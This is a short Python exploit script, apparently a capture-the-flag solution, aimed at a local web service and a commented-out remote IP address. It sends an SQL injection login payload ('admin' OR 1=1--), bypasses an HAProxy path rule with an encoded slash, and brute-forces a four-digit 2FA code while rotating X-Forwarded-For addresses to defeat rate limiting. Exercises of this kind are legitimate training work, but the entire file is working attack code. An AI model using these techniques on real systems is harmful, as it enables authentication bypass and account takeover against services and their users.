import requests

url = "http://localhost:1337"
# url = "http://94.237.54.116:47432"

def login():
	# sqli 
	data = {"username": "admin' OR 1=1--", "password": "123"}
	s = requests.Session()
	# haproxy bypass 
	resp = s.post(url+"/auth%2flogin", data=data)
	if "2fa" in resp.text:
		return s
	else:
		print("Error!")
	return False	

def verify_2fa(session, code, headers):
	data = {"2fa-code": code}	
	resp = requests.post(url+"/auth/verify-2fa", data=data, headers=headers)
	print(resp.request.headers)
	if "Invalid 2FA" in resp.text:
		return False
	return resp.text

def octal_to_ipv4(octal):
    decimal = int(octal, 8)
    return '.'.join(str((decimal >> (8 * i)) & 255) for i in reversed(range(4)))


# s = login()
s = True
# brute2fa
headers = {"X-Forwarded-For": "0"}
if s: 
	# pitchfork X-Forwarded-For:2facode 
	for i in range(10000):
		# Rate-limit bypass 
		octal = f"7111{i:04o}"
		ipv4 = octal_to_ipv4(octal)
		headers["X-Forwarded-For"] = ipv4

		# 2fa-code bruteforce
		code = f"{i:04}" 
		print(f"{headers}: {code}")
	
		resp = verify_2fa(s, code, headers)
		if resp:
			print(resp)
			break	
